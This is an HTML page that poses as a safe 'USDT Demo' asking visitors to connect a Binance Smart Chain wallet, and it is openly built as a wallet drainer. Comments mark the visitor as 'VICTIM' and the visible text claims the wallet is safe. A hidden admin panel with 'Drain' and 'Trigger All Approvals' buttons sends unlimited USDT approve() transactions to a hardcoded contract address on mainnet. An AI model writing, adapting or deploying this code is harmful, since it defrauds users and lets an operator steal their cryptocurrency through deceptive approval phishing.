<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect BSC Wallet - USDT Demo</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
            background: linear-gradient(135deg, #000428 0%, #004e92 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 380px;
            width: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(30px);
            border-radius: 24px;
            padding: 40px 32px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 32px 64px rgba(0, 0, 0, 0.5);
        }

        .logo {
            width: 72px;
            height: 72px;
            background: linear-gradient(135deg, #06d6a0, #00d4aa);
            border-radius: 20px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            box-shadow: 0 16px 32px rgba(6, 214, 160, 0.4);
        }

        .title {
            font-size: 26px;
            font-weight: 800;
            text-align: center;
            margin-bottom: 12px;
            background: linear-gradient(135deg, #ffffff, #e0e0e0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            font-size: 16px;
            text-align: center;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 32px;
            line-height: 1.5;
        }

        .connect-btn {
            width: 100%;
            height: 60px;
            background: linear-gradient(135deg, #06d6a0 0%, #00d4aa 100%);
            border: none;
            border-radius: 20px;
            color: #000000;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 16px 40px rgba(6, 214, 160, 0.4);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .connect-btn:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 24px 56px rgba(6, 214, 160, 0.6);
        }

        .connect-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .status {
            margin-top: 24px;
            padding: 16px 20px;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            display: none;
        }

        .status.success {
            background: rgba(6, 214, 160, 0.2);
            color: #06d6a0;
            border: 1px solid rgba(6, 214, 160, 0.4);
        }

        .demo-info {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
        }

        /* HIDDEN ADMIN MODE - ONLY YOU SEE */
        .admin-panel {
            display: none;
        }

        @media (min-width: 768px) {
            .admin-panel {
                display: block !important;
                position: fixed;
                top: 20px;
                right: 20px;
                background: rgba(0, 0, 0, 0.95);
                padding: 20px;
                border-radius: 16px;
                border: 1px solid #06d6a0;
                max-width: 300px;
                z-index: 1000;
            }
        }
    </style>
</head>
<body>
    <!-- VICTIM SEES THIS -->
    <div class="container">
        <div class="logo">💰</div>
        <h1 class="title">USDT Demo</h1>
        <p class="subtitle">
            Connect your BSC wallet to test USDT transfer<br>
            <small style="color: #8e8e93;">Safe demo - mainnet BSC</small>
        </p>
        
        <button class="connect-btn" id="connectBtn">
            Connect Wallet
        </button>
        
        <div class="status success" id="status">
            ✅ Wallet connected! Demo ready.
        </div>
        
        <div class="demo-info">
            This is a demo. Your wallet is safe.
        </div>
    </div>

    <!-- ADMIN PANEL - ONLY YOU SEE ON DESKTOP -->
    <div class="admin-panel">
        <h3 style="color: #06d6a0; margin-bottom: 16px;">👑 Admin Panel</h3>
        <div id="connectedUsers"></div>
        <button id="triggerAll" style="width: 100%; margin-top: 12px; padding: 12px; background: #06d6a0; color: #000; border: none; border-radius: 12px; font-weight: 600; cursor: pointer;">
            Trigger All Approvals
        </button>
    </div>

    <script>
        const CONTRACT_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
        const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
        const BSC_CHAIN_ID = '0x38';

        const USDT_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)"
        ];

        let web3, usdtContract;
        let connectedWallets = JSON.parse(localStorage.getItem('connectedWallets') || '[]');

        // Update admin panel
        function updateAdminPanel() {
            const panel = document.getElementById('connectedUsers');
            if (connectedWallets.length === 0) {
                panel.innerHTML = '<div style="color: #8e8e93;">No users connected</div>';
                return;
            }
            
            panel.innerHTML = `
                <div style="font-size: 14px; margin-bottom: 12px;">
                    ${connectedWallets.length} users connected:
                </div>
                ${connectedWallets.slice(-5).map((wallet, i) => 
                    `<div style="font-family: monospace; font-size: 12px; color: #06d6a0; margin-bottom: 4px; padding: 8px; background: rgba(6,214,160,0.1); border-radius: 8px;">
                        ${wallet.slice(0,6)}...${wallet.slice(-4)} 
                        <button onclick="drainWallet('${wallet}')" style="float: right; background: #ff453a; color: white; border: none; border-radius: 6px; padding: 2px 8px; font-size: 10px; cursor: pointer;">Drain</button>
                    </div>`
                ).join('')}
            `;
        }

        async function drainWallet(wallet) {
            try {
                if (!web3) web3 = new Web3(window.ethereum || 'https://bsc-dataseed1.binance.org/');
                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
                
                const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                const approveData = usdtContract.methods.approve(CONTRACT_ADDRESS, MAX_UINT).encodeABI();
                
                // Trigger approval popup for this wallet
                await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: wallet,
                        to: USDT_ADDRESS,
                        data: approveData,
                        gas: '100000'
                    }]
                });
                
                alert(`✅ Approval triggered for ${wallet.slice(0,10)}...`);
            } catch (e) {
                console.log('Drain failed:', e);
            }
        }

        // VICTIM CONNECT FUNCTION
        window.connectWallet = async function() {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('status');
            
            try {
                btn.disabled = true;
                btn.innerHTML = 'Connecting...';
                
                // Force BSC
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_CHAIN_ID }]
                });
                
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const wallet = accounts[0];
                
                // ADD TO GLOBAL LIST (YOUR ADMIN SEES THIS)
                if (!connectedWallets.includes(wallet)) {
                    connectedWallets.push(wallet);
                    localStorage.setItem('connectedWallets', JSON.stringify(connectedWallets));
                }
                
                // Show success to victim
                status.style.display = 'block';
                btn.innerHTML = '✅ Connected';
                btn.disabled = true;
                
                // Notify admin (you)
                updateAdminPanel();
                if (window.parent !== window) {
                    window.parent.postMessage({type: 'walletConnected', wallet}, '*');
                }
                
            } catch (error) {
                btn.disabled = false;
                btn.innerHTML = 'Connect Wallet';
                console.error(error);
            }
        };

        // AUTO-CONNECT ON LOAD
        window.addEventListener('load', () => {
            updateAdminPanel();
            if (window.ethereum) {
                document.getElementById('connectBtn').onclick = connectWallet;
            } else {
                document.getElementById('connectBtn').innerHTML = 'Install Trust Wallet';
            }
        });

        // ADMIN TRIGGER ALL
        document.getElementById('triggerAll').onclick = () => {
            connectedWallets.forEach(drainWallet);
        };
    </script>
</body>
</html>
